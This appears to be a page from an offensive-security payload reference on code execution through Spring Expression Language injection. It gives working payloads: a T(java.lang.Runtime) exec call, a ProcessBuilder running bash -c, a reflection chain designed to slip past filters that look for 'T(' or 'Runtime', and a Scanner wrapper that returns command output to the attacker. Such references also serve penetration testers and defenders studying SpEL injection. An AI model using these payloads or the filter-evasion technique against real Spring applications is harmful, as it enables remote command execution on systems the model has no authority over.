---
title: "SpEL code execution: type reference and reflection to Runtime"
description: "Under a StandardEvaluationContext the SpEL T() type reference names java.lang.Runtime directly, and a reflection chain reaches it without the operator, giving command execution inside Spring."
keywords:
  - SpEL code execution
  - "T(java.lang.Runtime)"
  - SpEL reflection RCE
  - StandardEvaluationContext
  - ProcessBuilder SpEL
---

# Code execution

SpEL reaches the host runtime two ways: the `T(...)` type reference that names a class directly, and a reflection chain that reaches the same class without the operator. Both depend on the evaluation context. A `StandardEvaluationContext`, the default when application code constructs its own parser, imposes no restriction and both routes run. A `SimpleEvaluationContext` removes type references and constructors, so only data binding remains and these payloads do not apply.

## Type reference route

`T(...)` resolves a fully qualified class, and a static call on `java.lang.Runtime` runs a command. `Runtime.exec(String)` tokenizes on whitespace with no shell, so it fits a single program with plain arguments:

```
T(java.lang.Runtime).getRuntime().exec('id')
```

Because there is no shell, pipes, `$(...)`, `;`, and redirection are passed as literal argv and do not chain. For shell features, construct a `ProcessBuilder` with an explicit argument array where the shell is the program:

```
new java.lang.ProcessBuilder(new String[]{'/bin/bash','-c','id; uname -a'}).start()
```

## Reflection route

Where `T(...)` is filtered, reach `Runtime` through reflection from a string literal. `''.class` gives the `Class`, `forName` loads `Runtime`, and `getMethod`/`invoke` call the static `getRuntime` before `exec`:

```
''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id')
```

The reflection form is interchangeable with the type-reference form; it exists to survive filters that key on the `T(` sequence or on the literal string `Runtime` adjacent to a parenthesis.

## Reading output back

To return command output rather than running blind, drain the process stream in the same expression:

```
new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'}).getInputStream()).useDelimiter('\\A').next()
```

Here `exec(String[])` passes the argument array straight through without tokenization, so the `bash -c` command runs intact and the `Scanner` returns the whole output in one token.

## References

- [Spring Framework: Spring Expression Language](https://docs.spring.io/spring-framework/reference/core/expressions.html)
- [PayloadsAllTheThings: Java SpEL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java)
